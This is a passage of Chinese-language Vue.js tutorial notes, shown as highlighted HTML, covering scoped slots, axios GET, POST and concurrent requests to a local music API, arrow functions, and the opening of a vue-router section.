punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>引用组件时，在填充插槽的模版上使用<code>slot-scopt</code>属性获取插槽绑定的值</li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>page-frame</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>标题<span class="token punctuation">"</span></span> <span class="token attr-name">cr</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>千锋武汉<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">slot</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>歌曲名、歌手<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>doSearch<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>搜索<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--在使用模版填充组件插槽时，可以使用slot-scope属性获取组件插槽绑定的数据的集合 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">slot</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s2<span class="token punctuation">"</span></span> <span class="token attr-name">slot-scope</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>res<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>table table-bordered table-condensed<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>序号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>歌曲ID<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>歌曲名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>歌手<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>专辑<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>时长<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>操作<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>song,index in res.musics<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>{{index+1}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>{{song.id}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>                    {{song.name}}                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>artist in song.artists<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                        <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>{{artist.name}}                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>{{song.album.name}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8%<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                    {{   Math.floor( Math.round(song.duration/1000)/60) &lt; 10 ? '0'+Math.floor( Math.round(song.duration/1000)/60) : Math.floor( Math.round(song.duration/1000)/60)    }}                                                                            :                                                                            {{   Math.round(song.duration/1000)%60 &lt;10 ? '0'+( Math.round(song.duration/1000)%60 ) : Math.round(song.duration/1000)%60  }}                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10%<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span>  <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary btn-xs<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>播放<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>page-frame</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十二、axios"><a href="#十二、axios" class="headerlink" title="十二、axios"></a>十二、axios</h2><h4 id="12-1-axios介绍"><a href="#12-1-axios介绍" class="headerlink" title="12.1 axios介绍"></a>12.1 axios介绍</h4><blockquote><p>vue可以实现数据的渲染，但是如何获取数据呢？</p><p>vue本身不具备通信能力，通常结合axios—一个专注于异步通信的js框架来使用</p><ul><li>axios 数据通信</li><li>vue 数据渲染</li></ul></blockquote><h4 id="12-2-axios入门使用"><a href="#12-2-axios入门使用" class="headerlink" title="12.2 axios入门使用"></a>12.2 axios入门使用</h4><ul><li>原生ajax — 实现步骤复杂</li><li>jQuery  笨重  </li><li>axios    简洁、高效，对RESTful支持良好</li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/axios.min.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>测试1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>methods<span class="token operator">:</span><span class="token punctuation">{</span><span class="token function-variable function">test1</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//发送异步请求</span><span class="token comment">//  axios.get(url).then(fn);</span><span class="token comment">//  axios.get(url,{}).then(fn)</span>axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"http://localhost:9999/music/detail"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>params<span class="token operator">:</span><span class="token punctuation">{</span>id<span class="token operator">:</span><span class="token string">"25640392"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="12-3-axios异步请求方法"><a href="#12-3-axios异步请求方法" class="headerlink" title="12.3 axios异步请求方法"></a>12.3 axios异步请求方法</h4><blockquote><p>axios提供了多种异步请求方法，实现对RESTful风格的支持</p></blockquote><h6 id="12-3-1-get请求"><a href="#12-3-1-get请求" class="headerlink" title="12.3.1 get请求"></a>12.3.1 get请求</h6><ul><li><p>axios.get(url).then(fn);</p></li><li><p>axios.get(url,{}).then(fn)</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//使用axios的get请求传递参数，需要将参数设置在params下</span>axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"http://localhost:9999/music/detail"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>    params<span class="token operator">:</span><span class="token punctuation">{</span>        id<span class="token operator">:</span><span class="token string">"25640392"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="12-3-2-post请求"><a href="#12-3-2-post请求" class="headerlink" title="12.3.2 post请求"></a>12.3.2 post请求</h6><ul><li><p>axios.post(url,{}).then(fn)</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"http://localhost:9999/music/search"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>s<span class="token operator">:</span><span class="token string">"阿刁"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="12-3-3-自定义请求"><a href="#12-3-3-自定义请求" class="headerlink" title="12.3.3 自定义请求"></a>12.3.3 自定义请求</h6><blockquote><p>自定义请求：自定义请求方式、请求参数、请求头、请求体（post）</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">axios</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    url<span class="token operator">:</span><span class="token string">"http://localhost:9999/music/search"</span><span class="token punctuation">,</span>    method<span class="token operator">:</span><span class="token string">"post"</span><span class="token punctuation">,</span>    params<span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token comment">//设置请求行传值</span>        s<span class="token operator">:</span><span class="token string">"成都"</span><span class="token punctuation">,</span>        limit<span class="token operator">:</span><span class="token number">15</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    headers<span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token comment">//设置请求头</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    data<span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token comment">//设置请求体（post/put）</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="12-3-4-其他"><a href="#12-3-4-其他" class="headerlink" title="12.3.4 其他"></a>12.3.4 其他</h6><ul><li>delete</li><li>put</li><li>option</li></ul><h4 id="12-4-并发请求"><a href="#12-4-并发请求" class="headerlink" title="12.4 并发请求"></a>12.4 并发请求</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>测试1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        methods<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token function-variable function">test1</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment">//发送异步请求</span>               axios<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">listMusics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">getMusicDetail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>axios<span class="token punctuation">.</span><span class="token function">spread</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">r1<span class="token punctuation">,</span> r2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment">// 两个请求现在都执行完成</span>                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r1<span class="token punctuation">)</span><span class="token punctuation">;</span>                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r2<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">listMusics</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'http://localhost:9999/music/search?s=成都'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">getMusicDetail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'http://localhost:9999/music/detail?id=25640392'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="12-5-箭头函数"><a href="#12-5-箭头函数" class="headerlink" title="12.5 箭头函数"></a>12.5 箭头函数</h4><h6 id="12-5-1-axios回调函数的参数res"><a href="#12-5-1-axios回调函数的参数res" class="headerlink" title="12.5.1 axios回调函数的参数res"></a>12.5.1 axios回调函数的参数res</h6><blockquote><p>res并不是接口返回的数据，而是表示一个响应对象；res.data才表示接口响应的数据</p></blockquote><h6 id="12-5-2-箭头函数"><a href="#12-5-2-箭头函数" class="headerlink" title="12.5.2 箭头函数"></a>12.5.2 箭头函数</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span>            song<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        methods<span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token function-variable function">test1</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment">//发送异步请求</span>                axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"http://localhost:9999/music/detail?id=25640392"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>                    <span class="token comment">// res并不是接口返回的数据，而是表示一个响应对象；res.data才表示接口响应的数据</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>song <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>songs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十三、路由-router"><a href="#十三、路由-router" class="headerlink" title="十三、路由 router"></a>十三、路由 router</h2><blockquote><p>router是由vue官方提供的用于实现组件跳转的插件</p></blockquote><h4 id="13-1-路由插件的引用"><a href="#13-1-路由插件的引用" class="headerlink" title="13.1 路由插件的引用"></a>13.1 路由插件的引用</h4><h6 id="13-3-1-离线"><a href="#13-3-1-离线" class="headerlink" title="13.3.1 离线"></a>13.3.1 离线</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue-router.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h6 id="13-3-2-在线CDN"><a href="#13-3-2-在线CDN" class="headerlink" title="13.3.2 在线CDN"></a>13.3.2 在线CDN</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://unpkg.com/vue/dist/vue.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token 